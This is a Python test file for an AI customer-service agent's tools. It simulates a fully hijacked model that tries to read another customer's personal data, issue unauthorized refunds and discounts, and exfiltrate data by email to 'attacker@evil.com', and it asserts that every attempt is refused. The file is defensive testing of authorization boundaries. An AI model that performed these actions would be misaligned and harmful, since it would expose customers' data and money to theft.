from __future__ import annotations

from pathlib import Path
from typing import TYPE_CHECKING, cast

import db
import tools

if TYPE_CHECKING:
    from strands.types.tools import ToolContext


def _init_tmp_db(tmp_path: Path) -> str:
    db_path = str(tmp_path / "test.sqlite")
    db.initialize(db_path)
    return db_path


class _Session:
    """The session the application binds. A compromised model cannot touch it."""

    def __init__(self, **invocation_state: object) -> None:
        self.invocation_state = invocation_state


IDENTITY_TOOLS = [
    tools.get_customer_profile_tool,
    tools.list_orders_tool,
    tools.refund_order_tool,
    tools.apply_discount_tool,
    tools.send_email_tool,
]


def test_compromised_model_cannot_cause_harm(tmp_path: Path) -> None:
    """The capstone: assume the model is FULLY hijacked.

    We call the model-facing tools exactly as a hijacked model would -- it still
    controls only the business inputs. Identity (cust_001) and the approval token
    come from the session, which the model cannot reach. Every malicious action
    is refused, and the database is unchanged. The boundary holds regardless of
    what the model emits.
    """
    db_path = _init_tmp_db(tmp_path)
    ctx = cast("ToolContext", _Session(actor_customer_id="cust_001", db_path=db_path))  # no approval token

    attacks = [
        tools.get_customer_profile_tool("cust_002", tool_context=ctx),          # read others' PII
        tools.list_orders_tool("cust_002", tool_context=ctx),                   # read others' orders
        tools.refund_order_tool("order_002", 100, tool_context=ctx),            # refund not-owned order
        tools.refund_order_tool("order_001", 100, tool_context=ctx),            # owned, but no approval
        tools.apply_discount_tool("order_001", 90, tool_context=ctx),           # over the cap
        tools.send_email_tool("attacker@evil.com", "x", "data", tool_context=ctx),  # exfiltration
    ]
    assert all(r["status"] == "error" for r in attacks)

    conn = db.connect(db_path)
    try:
        o1 = conn.execute(
            "SELECT refunded_cents, discount_percent, status FROM orders WHERE order_id = 'order_001'"
        ).fetchone()
        o2 = conn.execute(
            "SELECT refunded_cents, status FROM orders WHERE order_id = 'order_002'"
        ).fetchone()
    finally:
        conn.close()

    assert o1["refunded_cents"] == 0 and o1["discount_percent"] == 0 and o1["status"] != "refunded"
    assert o2["refunded_cents"] == 0 and o2["status"] != "refunded"


def test_model_has_no_identity_or_approval_channel() -> None:
    """The model cannot assert identity or mint an approval: neither is a tool field."""
    for decorated_tool in IDENTITY_TOOLS:
        props = set(decorated_tool.tool_spec["inputSchema"]["json"].get("properties", {}))
        assert "actor_customer_id" not in props
        assert "actor_id" not in props
        assert "approval_token" not in props
